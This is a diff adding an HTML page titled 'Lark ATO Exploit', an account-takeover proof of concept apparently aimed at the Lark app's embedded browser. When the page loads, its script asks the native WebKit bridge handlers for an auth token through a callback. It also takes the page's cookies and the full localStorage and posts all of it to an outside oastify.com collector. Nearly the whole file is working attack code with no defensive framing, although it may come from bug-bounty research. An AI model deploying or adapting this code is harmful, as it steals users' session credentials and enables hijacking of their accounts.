@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Lark ATO Exploit</title>
+</head>
+<body>
+    <h1>Extracting Lark Session...</h1>
+    <script>
+        const WEBHOOK_URL = "https://bze14eeug2h754wy1mnaysybq2wtkj88.oastify.com";
+
+        // Exfiltrate using no-cors so the browser doesn't block the POST
+        function exfiltrate(data) {
+            const payload = typeof data === 'string' ? data : JSON.stringify(data);
+            
+            // Method 1: fetch with no-cors
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: payload
+            }).catch(e => console.error(e));
+            
+            // Method 2: Image GET fallback (just in case)
+            // let b64 = btoa(unescape(encodeURIComponent(payload)));
+            // new Image().src = WEBHOOK_URL + "?data=" + b64;
+        }
+
+        // The callback function the Native App will execute when it finishes getting the token
+        window.larkAtoCallback = function(response) {
+            exfiltrate({
+                type: "native_callback_triggered",
+                data: response
+            });
+        };
+
+        // Standard ByteDance / Lark invoke format
+        function stealToken() {
+            const payload = {
+                "apiName": "getAuthToken", 
+                "callbackID": "larkAtoCallback",
+                "data": {} 
+            };
+            const payloadStr = JSON.stringify(payload);
+
+            // Attempt 1: Using 'invokeNative'
+            if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.invokeNative) {
+                try {
+                    window.webkit.messageHandlers.invokeNative.postMessage(payload);
+                    exfiltrate("Sent to invokeNative (object)");
+                } catch(e) { }
+            }
+
+            // Attempt 2: Using 'invoke'
+            if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.invoke) {
+                try {
+                    window.webkit.messageHandlers.invoke.postMessage(payloadStr);
+                    exfiltrate("Sent to invoke (string)");
+                } catch(e) { }
+                
+                try {
+                    window.webkit.messageHandlers.invoke.postMessage(payload);
+                    exfiltrate("Sent to invoke (object)");
+                } catch(e) {}
+            }
+        }
+
+        // Start the attack
+        stealToken();
+        
+        // Also try dumping the Lark session cookies
+        exfiltrate({
+            type: "document_cookie",
+            cookie: document.cookie
+        });
+        
+        exfiltrate({
+            type: "local_storage",
+            storage: JSON.stringify(localStorage)
+        });
+
+    </script>
+</body>
+</html>
